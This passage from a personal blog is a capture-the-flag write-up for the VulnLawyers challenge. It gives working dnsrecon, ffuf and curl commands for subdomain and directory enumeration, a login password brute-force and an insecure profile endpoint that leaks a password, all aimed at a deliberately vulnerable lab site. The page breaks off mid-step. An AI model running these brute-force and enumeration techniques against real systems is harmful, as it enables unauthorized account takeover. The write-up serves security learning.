<!DOCTYPE html><html lang="en-US"><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><title>CTF Challenge VulnLawyers Writeup</title><meta property="og:type" content="article"/><meta property="og:title" content="CTF Challenge VulnLawyers Writeup"/><meta property="og:description" content="A writeup for the VulnLawyers challenge from ctfchallenge.com"/><meta property="og:image" content="https://ctfchallenge.com/images/ctflogo-trans.png"/><meta name="twitter:card" content="summary_large_image"/><script>
            MathJax = {
              tex: {
                inlineMath: [['$', '$']]
              },
              svg: {
                fontCache: 'global'
              }
            };
            console.log("Loaded MathJax config");
        </script><script id="MathJax-script" async="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><meta name="next-head-count" content="10"/><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"/><link rel="manifest" href="/site.webmanifest"/><script>if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {           document.documentElement.classList.add('dark')             } else {           document.documentElement.classList.remove('dark')             }</script><link rel="preload" href="/_next/static/css/2fa56c1d4287c028.css" as="style"/><link rel="stylesheet" href="/_next/static/css/2fa56c1d4287c028.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-cb7634a8b6194820.js" defer=""></script><script src="/_next/static/chunks/framework-e70c6273bfe3f237.js" defer=""></script><script src="/_next/static/chunks/main-a054bbf31fb90f6a.js" defer=""></script><script src="/_next/static/chunks/pages/_app-72b3c9a164c2775a.js" defer=""></script><script src="/_next/static/chunks/29107295-f29cbf9716887c91.js" defer=""></script><script src="/_next/static/chunks/123-2d5a47533d991588.js" defer=""></script><script src="/_next/static/chunks/pages/post/%5Bslug%5D-7fcd22e58c5c3195.js" defer=""></script><script src="/_next/static/kXWORFBNEYWabX1ovPQjE/_buildManifest.js" defer=""></script><script src="/_next/static/kXWORFBNEYWabX1ovPQjE/_ssgManifest.js" defer=""></script><script src="/_next/static/kXWORFBNEYWabX1ovPQjE/_middlewareManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><div class="flex flex-col min-h-screen"><header id="TOP" class="py-4 px-8"><div class="container max-w-3xl mx-auto flex justify-between"><a class="font-mono no-underline" href="/">~/</a><div class="font-mono my-auto text-accent-1-light dark:text-accent-1-dark"><span class="hidden sm:block ">cochaviz@bunkernet.dev</span> <span class="block sm:hidden ">cochaviz</span> </div><div class="flex gap-x-2"><a href="https://www.github.com/cochaviz"> github </a><a href="https://www.linkedin.com/in/cochaviz"> linkedin </a><button id="dark-mode-toggle-light" class="border-background-alter-light dark:border-background-alter-dark border-2 px-2 hidden dark:block">light mode</button><button id="dark-mode-toggle-dark" class="border-background-alter-light dark:border-background-alter-dark border-2 px-2 block dark:hidden">dark mode</button></div></div></header><main class="container max-w-2xl"><div><a class="text-5xl font-sans no-underline fixed bottom-5 right-5 sm:bottom-10 sm:right-10 z-50 bg-background-light dark:bg-background-dark border-border-light dark:border-border-dark px-3 pb-2 border-double border-4" href="#TOP">↑</a><h1>CTF Challenge VulnLawyers Writeup</h1><div><nav class="table-of-contents"><ol><li><a href="#a-little-disclaimer">A Little Disclaimer</a></li><li><a href="#flags">Flags</a><ol><li><a href="#data-baby-(enumeration)">Data Baby (Enumeration)</a></li><li><a href="#browsers-are-evil-(enumeration)">Browsers are Evil (Enumeration)</a></li><li><a href="#pipelining-(enumeration)">Pipelining (Enumeration)</a></li><li><a href="#higher-and-higher-(exploitation)">Higher and Higher (Exploitation)</a></li><li><a href="#some-more-digging-(exploitation)">Some More Digging (Exploitation)</a></li><li><a href="#finishing-up-(exploitation)">Finishing Up (Exploitation)</a></li></ol></li></ol></nav><h2 id="a-little-disclaimer" tabindex="-1">A Little Disclaimer</h2>
<p>So you're looking for answers, are ya? Well, I've got them, but for a price...
Namely a little bit of your time and attention:</p>
<p><strong>Please try the challenges yourself before checking the answers.</strong></p>
<p>CTF's are notoriously 'NP' prone. Once you've seen the answer, it's easy
to think you could've come up with that. There is nothing wrong with looking up
answers, but try reflect on why you couldn't figure it out. I try to explain my
thought process as best and brief as possible, but figuring it out yourself is
just the best feeling, so please give it another go when you're reading this!
I'll not include any of the flags to avoid people simply copying and pasting
them.</p>
<p>Another note, I create these writeups as if speaking to myself. If my manner of
speaking seems a bit odd, you try talking to yourself without sounding
a little odd.</p>
<h2 id="flags" tabindex="-1">Flags</h2>
<h3 id="data-baby-(enumeration)" tabindex="-1">Data Baby (Enumeration)</h3>
<p>The first flag can be found by performing a standard recon of the subdomains of
<code>vulnlawyers.co.uk</code>.</p>

      <div id="code-parent">
        <pre><code class="hljs">$ dnsrecon -d vulnlawyers<span class="hljs-selector-class">.co</span><span class="hljs-selector-class">.uk</span> -D ~/path/to/wordlists/subdomains<span class="hljs-selector-class">.txt</span> -t brt

<span class="hljs-selector-attr">[*]</span> Using the dictionary file: /home/zohar/Documents/Playground/wordlists/subdomains<span class="hljs-selector-class">.txt</span> (provided by user)
<span class="hljs-selector-attr">[*]</span> brt: Performing host and subdomain brute force against vulnlawyers<span class="hljs-selector-class">.co</span><span class="hljs-selector-class">.uk</span>...
<span class="hljs-selector-attr">[+]</span> 	A data<span class="hljs-selector-class">.vulnlawyers</span><span class="hljs-selector-class">.co</span><span class="hljs-selector-class">.uk</span> <span class="hljs-number">68.183</span>.<span class="hljs-number">255.206</span>
<span class="hljs-selector-attr">[+]</span> 	A www<span class="hljs-selector-class">.vulnlawyers</span><span class="hljs-selector-class">.co</span><span class="hljs-selector-class">.uk</span> <span class="hljs-number">68.183</span>.<span class="hljs-number">255.206</span>
<span class="hljs-selector-attr">[+]</span> <span class="hljs-number">2</span> Records Found
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="$ dnsrecon -d vulnlawyers.co.uk -D ~/path/to/wordlists/subdomains.txt -t brt

[*] Using the dictionary file: /home/zohar/Documents/Playground/wordlists/subdomains.txt (provided by user)
[*] brt: Performing host and subdomain brute force against vulnlawyers.co.uk...
[+] 	A data.vulnlawyers.co.uk 68.183.255.206
[+] 	A www.vulnlawyers.co.uk 68.183.255.206
[+] 2 Records Found
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <p>Doing a http request with <code>curl</code>, or opening the domain in your browser returns
some info about the API and the first flag.</p>

      <div id="code-parent">
        <pre><code class="hljs">$ curl http:<span class="hljs-regexp">//</span>data.vulnlawyers.co.uk -H <span class="hljs-string">&quot;Cookie: &lt;your_ctf_cookie&gt;&quot;</span>

{<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;VulnLawyers Website API&quot;</span>,<span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-string">&quot;2.1.04&quot;</span>,<span class="hljs-string">&quot;flag&quot;</span>:<span class="hljs-string">&quot;[^FLAG^1337-DIY-1337^FLAG^]&quot;</span>}
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="$ curl http://data.vulnlawyers.co.uk -H &quot;Cookie: <your_ctf_cookie>&quot;

{&quot;name&quot;:&quot;VulnLawyers Website API&quot;,&quot;version&quot;:&quot;2.1.04&quot;,&quot;flag&quot;:&quot;[^FLAG^1337-DIY-1337^FLAG^]&quot;}
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <h3 id="browsers-are-evil-(enumeration)" tabindex="-1">Browsers are Evil (Enumeration)</h3>
<p>Now that we know the different domains that are available to us, let's do some
recon on the different files and folders we have access to.</p>

      <div id="code-parent">
        <pre><code class="hljs">$ ffuf -w ~<span class="hljs-regexp">/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;&quot; -u http:/</span>/www.vulnlawyers.co.uk/FUZZ


        <span class="hljs-regexp">/&#x27;___\  /</span><span class="hljs-string">&#x27;___\           /&#x27;</span>___<span class="hljs-string">\</span>       
       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       
       <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\/\</span> <span class="hljs-string">\/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\</span>      
        <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span>      
         <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\____/</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>       
          <span class="hljs-string">\/_/</span>    <span class="hljs-string">\/_/</span>   <span class="hljs-string">\/___/</span>    <span class="hljs-string">\/_/</span>       

[...]
________________________________________________

css                     [Status: <span class="hljs-number">301</span>, Size: <span class="hljs-number">178</span>, Words: <span class="hljs-number">6</span>, Lines: <span class="hljs-number">8</span>, Duration: <span class="hljs-number">15ms</span>]
denied                  [Status: <span class="hljs-number">401</span>, Size: <span class="hljs-number">1020</span>, Words: <span class="hljs-number">178</span>, Lines: <span class="hljs-number">30</span>, Duration: <span class="hljs-number">15ms</span>]
images                  [Status: <span class="hljs-number">301</span>, Size: <span class="hljs-number">178</span>, Words: <span class="hljs-number">6</span>, Lines: <span class="hljs-number">8</span>, Duration: <span class="hljs-number">15ms</span>]
js                      [Status: <span class="hljs-number">301</span>, Size: <span class="hljs-number">178</span>, Words: <span class="hljs-number">6</span>, Lines: <span class="hljs-number">8</span>, Duration: <span class="hljs-number">14ms</span>]
login                   [Status: <span class="hljs-number">302</span>, Size: <span class="hljs-number">1119</span>, Words: <span class="hljs-number">197</span>, Lines: <span class="hljs-number">31</span>, Duration: <span class="hljs-number">16ms</span>]
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H &quot;Cookie: ctfchallenge=<your_ctf_cookie>&quot; -u http://www.vulnlawyers.co.uk/FUZZ


        /&lt;___\  /&lt;___\           /&lt;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

[...]
________________________________________________

css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]
denied                  [Status: 401, Size: 1020, Words: 178, Lines: 30, Duration: 15ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 14ms]
login                   [Status: 302, Size: 1119, Words: 197, Lines: 31, Duration: 16ms]
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <p>Since we are (always) looking to escalate privileges, the <code>login</code> endpoint looks
especially interesting. Entering <code>http://www.vulnlawyers.co.uk/login</code> in your
browser will lead to a page that says <strong>Acess is denied from your IP address</strong>.
Shit. But take a look at where we are <code>http://www.vulnlawyers.co.uk/denied</code>,
we've been rerouted.</p>
<p>Let's take a look at what happens with our request in the browser by opening the
developer tab (often <kbd>F12</kbd>, but if you didn't know that, you might want
to look into some other challenges). Opening the 'Network' tab (on
Firefox, might be different on Chrome, Safari, etc.) shows that we got a <code>302</code>
code from the <code>/login</code> endpoint. This code specifically tells a <em>browser</em> to
reroute to a URL given by the <code>Location</code> header <sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup>.</p>
<p>Browsers can do weird stuff, so let's try to ask <code>curl</code> what's up.</p>

      <div id="code-parent">
        <pre><code class="hljs">$ curl www.vulnlawyers.co.uk/login -H &quot;Cookie: ctfchallenge=<span class="hljs-tag">&lt;<span class="hljs-name">your_ctf_cookie</span>&gt;</span>&quot;

[...]
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-info&quot;</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Access to this portal can now be found here <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">/lawyers-only</span>&quot;&gt;</span>/lawyers-only<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>[^FLAG^TRY_ME_B*TCH^FLAG^]<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
[...]
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="$ curl www.vulnlawyers.co.uk/login -H &quot;Cookie: ctfchallenge=<your_ctf_cookie>&quot;

[...]
  <div class=&quot;alert alert-info&quot;>
      <p>Access to this portal can now be found here <a href=/lawyers-only&quot;>/lawyers-only</a></p>
      <p>[^FLAG^TRY_ME_B*TCH^FLAG^]</p>
  </div>
[...]
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <p>Well, would you look at that, a flag and a hidden endpoint 👀! Christmas
came early this year.</p>
<p>Opening the URL <code>http://www.vulnlawyers.co.uk/lawyers-only</code> will bring us to a
login screen. Now we can start gaining some unrequisited privileges.</p>
<h3 id="pipelining-(enumeration)" tabindex="-1">Pipelining (Enumeration)</h3>
<p>The current goal is to log in, but we lack any user data. Thinking back, the
<code>data.vulnlawyers.co.uk</code> probably contains some of that precious user data.
Actually, we have yet to enumerate files and folders. Not you tho, no, while we
were trying to figure out how to access the login page, you have of course
started <code>ffuf</code>'ing (that's not a word, but it should be) the domain. If you
haven't, keep in mind that reconnaissance can sometimes take a long time.
Minimize waiting and keep that noggin of yours churning.</p>

      <div id="code-parent">
        <pre><code class="hljs">$ ffuf -w ~<span class="hljs-regexp">/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;&quot; -u http:/</span>/data.vulnlawyers.co.uk/FUZZ


        <span class="hljs-regexp">/&#x27;___\  /</span><span class="hljs-string">&#x27;___\           /&#x27;</span>___<span class="hljs-string">\</span>       
       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       
       <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\/\</span> <span class="hljs-string">\/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\</span>      
        <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span>      
         <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\____/</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>       
          <span class="hljs-string">\/_/</span>    <span class="hljs-string">\/_/</span>   <span class="hljs-string">\/___/</span>    <span class="hljs-string">\/_/</span>       

[...]
________________________________________________
users                   [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">406</span>, Words: <span class="hljs-number">6</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">21ms</span>]
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H &quot;Cookie: ctfchallenge=<your_ctf_cookie>&quot; -u http://data.vulnlawyers.co.uk/FUZZ


        /&lt;___\  /&lt;___\           /&lt;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

[...]
________________________________________________
users                   [Status: 200, Size: 406, Words: 6, Lines: 1, Duration: 21ms]
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <p>'Lo and behold, an endpoint called <code>/users</code>. Let's employ <code>curl</code> and see what it
holds.</p>

      <div id="code-parent">
        <pre><code class="hljs">curl data.vulnlawyers.co.uk/users -H <span class="hljs-string">&quot;Cooki e: ctfchallenge=&lt;your_ctf_cookie&gt;&quot;</span>
{
  <span class="hljs-string">&quot;users&quot;</span>: [
    {
      <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Yusef Mcclain&quot;</span>,
      <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;yusef.mcclain@vulnlawyers.co.uk&quot;</span>
    },
    {
      <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Shayne Cairns&quot;</span>,
      <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;shayne.cairns@vulnlawyers.co.uk&quot;</span>
    },
    {
      <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Eisa Evans&quot;</span>,
      <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;eisa.evans@vulnlawyers.co.uk&quot;</span>
    },
    {
      <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Jaskaran Lowe&quot;</span>,
      <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;jaskaran.lowe@vulnlawyers.co.uk&quot;</span>
    },
    {
      <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Marsha Blankenship&quot;</span>,
      <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;marsha.blankenship@vulnlawyers.co.uk&quot;</span>
    }
  ],
  <span class="hljs-string">&quot;flag&quot;</span>: <span class="hljs-string">&quot;[^FLAG^https://media.giphy.com/media/26gs6vEzlpaxuYgso/giphy.gif^FLAG^]&quot;</span>
}
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="curl data.vulnlawyers.co.uk/users -H &quot;Cooki e: ctfchallenge=<your_ctf_cookie>&quot;
{
  &quot;users&quot;: [
    {
      &quot;name&quot;: &quot;Yusef Mcclain&quot;,
      &quot;email&quot;: &quot;yusef.mcclain@vulnlawyers.co.uk&quot;
    },
    {
      &quot;name&quot;: &quot;Shayne Cairns&quot;,
      &quot;email&quot;: &quot;shayne.cairns@vulnlawyers.co.uk&quot;
    },
    {
      &quot;name&quot;: &quot;Eisa Evans&quot;,
      &quot;email&quot;: &quot;eisa.evans@vulnlawyers.co.uk&quot;
    },
    {
      &quot;name&quot;: &quot;Jaskaran Lowe&quot;,
      &quot;email&quot;: &quot;jaskaran.lowe@vulnlawyers.co.uk&quot;
    },
    {
      &quot;name&quot;: &quot;Marsha Blankenship&quot;,
      &quot;email&quot;: &quot;marsha.blankenship@vulnlawyers.co.uk&quot;
    }
  ],
  &quot;flag&quot;: &quot;[^FLAG^https://media.giphy.com/media/26gs6vEzlpaxuYgso/giphy.gif^FLAG^]&quot;
}
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <p>And that's our third flag. Onto exploitation!</p>
<h3 id="higher-and-higher-(exploitation)" tabindex="-1">Higher and Higher (Exploitation)</h3>
<p>With a bit of luck, the attorneys are not technically inclined and use simple
passwords. After a bit of trail-and-error, we stumble upon Jaskaran Lowe.</p>

      <div id="code-parent">
        <pre><code class="hljs">ffuf -w ~<span class="hljs-regexp">/Documents/Playground/wordlists/passwords.txt -t 1 -p 0.1 -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;&quot; -u http:/</span>/www.vulnlawyers.co.uk/lawyers-only-login -H <span class="hljs-string">&quot;Content-Type: applicati
on/x-www-form-urlencoded&quot;</span> -d <span class="hljs-string">&#x27;email=jaskaran.lowe@vulnlawyers.co.uk&amp;password=FUZZ&#x27;</span> -fr <span class="hljs-string">&quot;Invalid&quot;</span>


        <span class="hljs-regexp">/&#x27;___\  /</span><span class="hljs-string">&#x27;___\           /&#x27;</span>___<span class="hljs-string">\</span>       
       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       
       <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\/\</span> <span class="hljs-string">\/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\</span>      
        <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span>      
         <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\____/</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>       
          <span class="hljs-string">\/_/</span>    <span class="hljs-string">\/_/</span>   <span class="hljs-string">\/___/</span>    <span class="hljs-string">\/_/</span>       

[...]
________________________________________________

summer                  [Status: <span class="hljs-number">302</span>, Size: <span class="hljs-number">0</span>, Words: <span class="hljs-number">1</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">17ms</span>]
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="ffuf -w ~/Documents/Playground/wordlists/passwords.txt -t 1 -p 0.1 -H &quot;Cookie: ctfchallenge=<your_ctf_cookie>&quot; -u http://www.vulnlawyers.co.uk/lawyers-only-login -H &quot;Content-Type: applicati
on/x-www-form-urlencoded&quot; -d &lt;email=jaskaran.lowe@vulnlawyers.co.uk&password=FUZZ&lt; -fr &quot;Invalid&quot;


        /&lt;___\  /&lt;___\           /&lt;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

[...]
________________________________________________

summer                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <p>Logging in using browser gives us some info regarding a case, but more
importantly, the next flag!</p>
<h3 id="some-more-digging-(exploitation)" tabindex="-1">Some More Digging (Exploitation)</h3>
<p>We got a whole new section of the site to explore! Now, it might be worth doing
some more fuzzing on the path since we've actually been redirected to
<code>.../lawyers-only-login</code> from <code>.../lawyers-only</code>, and opening the <strong>Profile
tab</strong> shows the path <code>.../lawyers-only-profile</code>. Thus, we run <code>ffuf [...] http://www.vulnlawyers.co.uk/lawyers-only-FUZZ</code> while further exploring the new
domain. Spoiler alert: no interesting results, but good habit nonetheless.</p>
<p>Looking at the <strong>Portal</strong> page shows a list of current cases. There is a single
case which is managed by <em>Shayne Cairns</em>, who is also the only one who can
perform actions on it. New goal: gain access to their account. Opening the
source code of the shows nothing interesting.</p>
<p>Taking a closer look at the <strong>Profile</strong> page shows us a place where we can
update our user data! Immediate thought: could we somehow use this to update
another user's profile info? Let's take a look at the request payload using the
<strong>Network</strong> tab in the dev tools.</p>

      <div id="code-parent">
        <pre><code class="hljs"><span class="hljs-attr">name</span>=Jaskaran+Lowe&amp;email=jaskaran.lowe%<span class="hljs-number">40</span>vulnlawyers.co.uk
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="name=Jaskaran+Lowe&email=jaskaran.lowe%40vulnlawyers.co.uk
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <p>Hmm, doesn't seem like it. This leads to finding more info in the request,
like a new cookie called <code>token</code>. Makes sense, these requests have to be
authenticated, we should include this in any requests we do via the terminal.
Otherwise, nothing seems unusual.</p>
<p>Perhaps we can find something interesting in the source code. Let's use <code>curl</code>
to retrieve the data.</p>

      <div id="code-parent">
        <pre><code class="hljs">$ curl curl http:<span class="hljs-comment">//www.vulnlawyers.co.uk/lawyers-only-profile -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;; token=&lt;your_lawyer_cookie&gt;&quot;</span>

&lt;script&gt;
    $.get<span class="hljs-constructor">JSON(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">lawyers</span>-<span class="hljs-params">only</span>-<span class="hljs-params">profile</span>-<span class="hljs-params">details</span><span class="hljs-operator">/</span>4&#x27;,<span class="hljs-params">function</span>(<span class="hljs-params">resp</span>)</span>{
        <span class="hljs-constructor">$(&#x27;<span class="hljs-params">input</span>[<span class="hljs-params">name</span>=<span class="hljs-string">&quot;email&quot;</span>]&#x27;)</span>.<span class="hljs-keyword">val</span>( resp.email );
        <span class="hljs-constructor">$(&#x27;<span class="hljs-params">input</span>[<span class="hljs-params">name</span>=<span class="hljs-string">&quot;name&quot;</span>]&#x27;)</span>.<span class="hljs-keyword">val</span>( resp.name );
    });
&lt;/script&gt;
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="$ curl curl http://www.vulnlawyers.co.uk/lawyers-only-profile -H &quot;Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>&quot;

<script>
    $.getJSON(&lt;/lawyers-only-profile-details/4&lt;,function(resp){
        $(&lt;input[name=&quot;email&quot;]&lt;).val( resp.email );
        $(&lt;input[name=&quot;name&quot;]&lt;).val( resp.name );
    });
</script>
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <p>Oh would you look at that 😎! That's how our info was already filled in!
For some reason they use some other source than the
<code>data.vulnlawyers.co.uk/users</code> endpoint which we've seen before. Maybe this
contains different information.</p>

      <div id="code-parent">
        <pre><code class="hljs">$ curl http:<span class="hljs-regexp">//</span>www.vulnlawyers.co.uk<span class="hljs-regexp">/lawyers-only-profile-details/</span><span class="hljs-number">4</span> -H <span class="hljs-string">&quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;; token=&lt;your_lawyer_cookie&gt;&quot;</span>

{
  <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">4</span>,
  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Jaskaran Lowe&quot;</span>,
  <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;jaskaran.lowe@vulnlawyers.co.uk&quot;</span>,
  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;summer&quot;</span>
}
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/4 -H &quot;Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>&quot;

{
  &quot;id&quot;: 4,
  &quot;name&quot;: &quot;Jaskaran Lowe&quot;,
  &quot;email&quot;: &quot;jaskaran.lowe@vulnlawyers.co.uk&quot;,
  &quot;password&quot;: &quot;summer&quot;
}
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
